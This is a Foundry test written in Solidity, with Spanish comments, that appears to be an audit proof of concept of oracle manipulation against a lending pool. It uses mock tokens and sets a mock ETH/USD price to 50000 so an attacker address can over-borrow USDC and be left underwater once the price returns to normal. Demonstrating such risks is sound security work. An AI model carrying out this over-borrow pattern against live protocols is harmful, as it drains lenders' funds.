// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*
PoC de manipulacion de oraculo

Si el precio ETH/USD se puede inflar de forma artificial, un atacante puede pedir mas USDC del permitido y quedar underwater cuando el precio vuelve a la normalidad.
Esto no es un bug si el oraculo es confiable, pero demuestra el riesgo de usar un feed manipulable.
*/

import "forge-std/Test.sol";
import {LendingPool} from "protocol/LendingPool.sol";
import {MockUSDC} from "protocol/MockUSDC.sol";
import {OracleMock} from "protocol/OracleMock.sol";
import {WETH9} from "protocol/WETH9.sol";

contract OracleManipulationPoC is Test {
    LendingPool pool;
    WETH9 weth;
    MockUSDC usdc;
    OracleMock oracle;

    address lender = makeAddr("lender");
    address attacker = makeAddr("attacker");

    uint256 constant FAIR_PRICE = 2000e8;
    uint256 constant SPIKE_PRICE = 50000e8;

    function setUp() public {
        weth = new WETH9();
        usdc = new MockUSDC();
        oracle = new OracleMock(FAIR_PRICE);

        pool = new LendingPool(address(weth), address(usdc), address(oracle), 7500, 8000, 200, 400, 2000, 8000, 1000);

        usdc.mint(lender, 1_000_000e6);
        vm.startPrank(lender);
        usdc.approve(address(pool), type(uint256).max);
        pool.depositUSDC(500_000e6);
        vm.stopPrank();
    }

    /*
    Demuestra que con un oraculo manipulable un atacante puede sobre pedir USDC y quedar underwater cuando el precio vuelve a la normalidad.
    */
    function testOracleManipulationAllowsOverBorrow() public {
        vm.deal(attacker, 1 ether);
        vm.startPrank(attacker);
        pool.depositETH{value: 1 ether}();

        oracle.setPrice(SPIKE_PRICE);
        uint256 maxBorrowManip = pool.getBorrowMax(attacker);
        uint256 borrowAmount = maxBorrowManip / 2;
        pool.borrowUSDC(borrowAmount);
        vm.stopPrank();

        oracle.setPrice(FAIR_PRICE);
        uint256 maxBorrowFair = pool.getBorrowMax(attacker);

        assertGt(borrowAmount, maxBorrowFair);
        assertLt(pool.getHealthFactor(attacker), 1e18);
    }
}
